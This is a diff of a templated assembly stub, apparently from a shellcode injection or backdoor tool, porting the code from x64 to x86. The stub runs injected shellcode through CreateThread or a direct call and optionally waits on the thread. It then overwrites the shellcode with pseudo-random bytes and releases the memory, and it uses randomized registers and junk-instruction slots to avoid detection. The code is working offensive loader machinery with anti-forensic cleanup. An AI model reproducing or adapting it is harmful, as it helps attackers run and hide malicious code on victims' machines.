@@ -406,81 +406,70 @@ entry:
 
 {{if .NeedCreateThread}}
   {{if .NeedJumper}}
-    mov r10, {{.RegN.rdi}}                     {{igi}} // address of image base
-    add r10, {{hex .JumperOffset}}             {{igi}} // address of jumper
-    mov r11, [rsp+0x08]                        {{igi}} // address of memory page
-    add r11, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+    mov {{.RegV.ecx}}, {{.RegN.edi}}           {{igi}} // address of image base
+    add {{.RegV.ecx}}, {{hex .JumperOffset}}   {{igi}} // address of jumper
+    mov {{.RegV.edx}}, [esp+0x04]              {{igi}} // address of memory page
+    add {{.RegV.edx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
   {{else}}
-    mov r10, [rsp+0x08]                        {{igi}} // address of memory page
-    add r10, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+    mov {{.RegV.ecx}}, [esp+0x04]              {{igi}} // address of memory page
+    add {{.RegV.ecx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
+    xor {{.RegV.edx}}, {{.RegV.edx}}           {{igi}} // clear register for lpParameter
   {{end}}
-
-  mov rax, [rsp+0x28]                          {{igi}} // address of CreateThread
-
-  sub rsp, 0x10                                {{igi}} // reserve stack for argument
-  xor rcx, rcx                                 {{igi}} // lpThreadAttributes
-  xor rdx, rdx                                 {{igi}} // dwStackSize
-  mov r8, r10                                  {{igi}} // lpStartAddress
-  mov r9, r11                                  {{igi}} // lpParameter
-  mov [rsp+0], rcx                             {{igi}} // dwCreationFlags
-  mov [rsp+8], rcx                             {{igi}} // lpThreadId
-  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
-  call rax                                     {{igi}} // call CreateThread
-  add rsp, 0x20                                {{igi}} // restore stack for call convention
-  add rsp, 0x10                                {{igi}} // restore stack for argument
-
+  xor {{.RegV.eax}}, {{.RegV.eax}}             {{igi}} // clear register for push 0
+  push {{.RegV.eax}}                           {{igi}} // lpThreadId
+  push {{.RegV.eax}}                           {{igi}} // dwCreationFlags
+  push {{.RegV.edx}}                           {{igi}} // lpParameter
+  push {{.RegV.ecx}}                           {{igi}} // lpStartAddress
+  push {{.RegV.eax}}                           {{igi}} // dwStackSize
+  push {{.RegV.eax}}                           {{igi}} // lpThreadAttributes
+  mov {{.RegV.eax}}, [esp+0x2C]                {{igi}} // address of CreateThread
+  call {{.RegV.eax}}                           {{igi}} // call CreateThread
   {{if .NeedWaitThread}}
-    mov rcx, rax                               {{igi}} // hHandle, hThread
-    mov rdx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
-    mov rax, [rsp+0x30]                        {{igi}} // address of WaitForSingleObject
-    sub rsp, 0x20                              {{igi}} // reserve stack for call convention
-    call rax                                   {{igi}} // call WaitForSingleObject
-    add rsp, 0x20                              {{igi}} // restore stack for call convention
+    mov edx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
+    push edx                                   {{igi}} // push argument
+    push eax                                   {{igi}} // hHandle, hThread
+    mov {{.RegV.eax}}, [esp+0x20]              {{igi}} // address of WaitForSingleObject
+    call {{.RegV.eax}}                         {{igi}} // call WaitForSingleObject
   {{end}}
 {{else}}
-  mov {{.RegV.rax}}, [rsp+0x08]                {{igi}} // address of allocated memory
-  add {{.RegV.rax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
-  call {{.RegV.rax}}                           {{igi}} // call shellcode
-  add rsp, 0x20                                {{igi}} // restore stack for call convention
+  mov {{.RegV.eax}}, [esp+0x04]                {{igi}} // address of allocated memory
+  add {{.RegV.eax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  call {{.RegV.eax}}                           {{igi}} // call shellcode
 {{end}}
 
 // =================================== erase shellcode ===================================
 
 {{if .NeedEraseShellcode}}
   // overwrite memory data
-  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
-  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
-  sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
+  mov {{.RegV.edx}}, [esp+0x04]                {{igi}} // address of memory page
+  add {{.RegV.edx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  mov {{.RegV.ecx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  sub {{.RegV.ecx}}, 3                         {{igi}} // adjust loop times
   // calculate a random seed from registers
-  add {{.RegV.rax}}, rsp                       {{igi}}
-  add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.rsi}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.rdi}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.r8}}               {{igi}}
-  add {{.RegV.rax}}, {{.Reg.r9}}               {{igi}}
-  add {{.RegV.rax}}, {{.Reg.r10}}              {{igi}}
-  add {{.RegV.rax}}, {{.Reg.r11}}              {{igi}}
+  add {{.RegV.eax}}, esp                       {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ebx}}              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ecx}}              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edx}}              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.esi}}              {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edi}}              {{igi}}
  loop_erase:
   // it will waste some loop but clean code
   call xor_shift                               {{igi}}
-  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{igi}}
+  mov [{{.RegV.edx}}], {{.RegV.eax}}           {{igi}}
   // check erase instruction is finish
-  inc {{.RegV.rdx}}                            {{igi}}
-  dec {{.RegV.rcx}}                            {{igi}}
+  inc {{.RegV.edx}}                            {{igi}}
+  dec {{.RegV.ecx}}                            {{igi}}
   jnz loop_erase                               {{igi}}
 
   // release allocated memory page
-  mov rax, [rsp+0x18]                          {{igi}} // address of VirtualFree
-  mov rcx, [rsp+0x08]                          {{igi}} // address of allocated memory
-  xor rdx, rdx                                 {{igi}} // dwSize
-  mov r8, 0x8000                               {{igi}} // dwFreeType MEM_RELEASE
-  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
-  call rax                                     {{igi}} // call VirtualFree
-  add rsp, 0x20                                {{igi}} // restore stack for call convention
+  mov {{.RegV.eax}}, [esp+0x0C]                {{igi}} // address of VirtualFree
+  mov {{.RegV.ecx}}, [esp+0x04]                {{igi}} // address of allocated memory
+  mov {{.RegV.edx}}, 0x8000                    {{igi}} // dwFreeType MEM_RELEASE
+  push {{.RegV.edx}}                           {{igi}} // push argument
+  xor {{.RegV.edx}}, {{.RegV.edx}}             {{igi}} // dwSize
+  push {{.RegV.edx}}                           {{igi}} // push argument
+  push {{.RegV.ecx}}                           {{igi}} // lpAddress
+  call {{.RegV.eax}}                           {{igi}} // call VirtualFree
 {{end}}
 
 // ================================== clean environment ==================================
